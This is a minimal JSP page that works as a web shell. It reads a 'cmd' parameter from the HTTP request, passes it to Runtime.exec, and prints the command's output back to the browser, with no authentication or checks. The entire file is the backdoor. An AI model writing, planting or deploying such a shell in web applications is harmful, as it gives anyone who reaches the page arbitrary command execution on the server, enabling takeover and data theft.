<%@ page import="java.io.*"%>
<%
    out.print("Hello</br>");
    String strcmd = request.getParameter("cmd");
    String line =null;
    Process p=Runtime.getRuntime().exec(strcmd);
     InputStream is = p.getInputStream();
      BufferedReader br = new BufferedReader(new InputStreamReader(is));
    while((line =br.readLine())!=null){
        out.print(line+"<br>");
    }
%>